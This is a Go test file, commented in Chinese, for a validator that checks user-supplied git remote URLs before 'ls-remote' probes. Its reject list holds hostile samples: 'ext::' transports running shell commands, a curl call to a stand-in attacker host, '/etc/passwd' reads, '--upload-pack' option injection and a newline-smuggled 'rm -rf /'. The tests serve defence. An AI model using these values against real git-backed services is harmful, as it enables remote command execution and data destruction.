package api

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// 远端地址来自用户输入并直接交给 git。ext:: 传输会把 URL 里的内容当命令执行，
// 放行它等于开了一个远程命令执行口子；file:// 和本地路径则能用来试探服务器目录。
func TestValidateCodeGitProbeRemoteRejectsDangerousTransports(t *testing.T) {
	rejected := []string{
		"ext::sh -c 'touch /tmp/pwned'",
		"ext::curl http://attacker.example",
		"file:///etc/passwd",
		"/etc/passwd",
		"../../../etc",
		"--upload-pack=touch /tmp/pwned",
		"-u",
		"https://example.com/repo\nrm -rf /",
		"https://example.com/repo\x00",
		"",
		"   ",
		"transport::https://example.com/repo",
	}
	for _, remote := range rejected {
		if _, err := validateCodeGitProbeRemote(remote); err == nil {
			t.Fatalf("应被拒绝：%q", remote)
		}
	}
}

func TestValidateCodeGitProbeRemoteAcceptsRealRepositoryURLs(t *testing.T) {
	accepted := []string{
		"https://codeup.aliyun.com/64dc/gopanel.git",
		"http://internal.example/team/repo.git",
		"ssh://git@github.com:22/org/repo.git",
		"git@github.com:org/repo.git",
		"  https://example.com/repo.git  ",
	}
	for _, remote := range accepted {
		normalized, err := validateCodeGitProbeRemote(remote)
		if err != nil {
			t.Fatalf("应被接受：%q，实际 %v", remote, err)
		}
		if strings.TrimSpace(normalized) != normalized || normalized == "" {
			t.Fatalf("归一化结果异常：%q", normalized)
		}
	}
}

func TestValidateCodeGitProbeRemoteRejectsOversizedInput(t *testing.T) {
	if _, err := validateCodeGitProbeRemote("https://example.com/" + strings.Repeat("a", 4096)); err == nil {
		t.Fatal("超长地址应被拒绝")
	}
}

// 凭据信息不全时不该真的去连——那只会得到一个含义不明的 git 报错。
func TestProbeCodeGitCredentialRemoteRequiresCompleteCredential(t *testing.T) {
	if err := probeCodeGitCredentialRemote("", "token", "https://example.com/repo.git"); err == nil {
		t.Fatal("缺用户名应被拒绝")
	}
	if err := probeCodeGitCredentialRemote("user", "", "https://example.com/repo.git"); err == nil {
		t.Fatal("缺令牌应被拒绝")
	}
	// 地址校验要发生在真正发起连接之前。
	if err := probeCodeGitCredentialRemote("user", "token", "ext::sh -c whoami"); err == nil {
		t.Fatal("危险地址应在连接前就被拒绝")
	}
}

// 探测能真的读到本地仓库，说明 ls-remote 这条路本身是通的。
// 本地路径在校验里被挡掉，所以这里用 file:// 之外的方式验证：
// 直接对一个可访问的 http 风格地址做校验会引入网络依赖，因此只验通路，
// 用一个必定失败的地址确认错误信息被正常带回。
func TestProbeCodeGitCredentialRemoteReportsUnreachableRemote(t *testing.T) {
	repositoryDir := createCodeGitRepository(t)
	if _, err := os.Stat(filepath.Join(repositoryDir, ".git")); err != nil {
		t.Skipf("测试仓库不可用：%v", err)
	}
	// 127.0.0.1:1 上不会有服务，连接会立刻被拒——用来确认错误能带回来
	// 而不是被吞掉，同时不引入外网依赖。
	err := probeCodeGitCredentialRemote("user", "token", "http://127.0.0.1:1/repo.git")
	if err == nil {
		t.Fatal("连不上的远端应返回错误")
	}
	if strings.TrimSpace(err.Error()) == "" {
		t.Fatal("错误信息不该为空")
	}
}
